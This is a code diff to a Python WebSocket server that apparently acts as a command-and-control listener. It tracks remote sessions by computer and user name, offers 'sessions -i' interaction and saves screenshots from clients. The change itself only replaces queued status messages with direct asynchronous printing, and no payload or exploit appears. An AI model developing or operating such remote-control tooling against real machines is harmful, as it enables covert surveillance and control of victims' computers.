@@ -422,7 +422,7 @@ class WebSocketServer:
                         pass
                     if sid in self.sessions:
                         del self.sessions[sid]
-                    self.message_queue.put(f"\033[93m[!]\033[0m Closed duplicate session {sid} from {client_ip}")
+                    self.async_print(f"\033[93m[!]\033[0m Closed duplicate session {sid} from {client_ip}")
         
         self.sessions[session_id] = {
             'websocket': websocket,
@@ -443,9 +443,9 @@ class WebSocketServer:
         CYAN = '\033[96m'
         RESET = '\033[0m'
         
-        # Use message queue to avoid breaking user input
-        self.message_queue.put(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
-        self.message_queue.put(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
+        # Show notification immediately without breaking input
+        self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
+        self.async_print(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
         
         try:
             async for message in websocket:
@@ -512,10 +512,10 @@ class WebSocketServer:
                                     del self.sessions[dup_sid]
                                 if self.active_session == dup_sid:
                                     self.active_session = None
-                                self.message_queue.put(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same client: {session.get('client_id', session['computer'])})")
+                                self.async_print(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same client: {session.get('client_id', session['computer'])})")
                             
                             os_label = session['os_type'].upper() if session['os_type'] != 'unknown' else 'UNKNOWN'
-                            self.message_queue.put(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
+                            self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
                 except:
                     pass
                 
@@ -679,7 +679,7 @@ class WebSocketServer:
         except websockets.exceptions.ConnectionClosed:
             pass
         except Exception as e:
-            self.message_queue.put(f"\033[91m[!]\033[0m Error: {e}")
+            self.async_print(f"\033[91m[!]\033[0m Error: {e}")
         finally:
             was_active = (self.active_session == session_id)
             if session_id in self.sessions:
@@ -687,9 +687,9 @@ class WebSocketServer:
             if self.active_session == session_id:
                 self.active_session = None
             
-            self.message_queue.put(f"\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
+            self.async_print(f"\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
             if was_active:
-                self.message_queue.put("[!] You were interacting with this session - returned to server prompt")
+                self.async_print("[!] You were interacting with this session - returned to server prompt")
     
     async def save_screenshot(self, session_id, data):
         """Save screenshot (handles base64 encoded data)"""
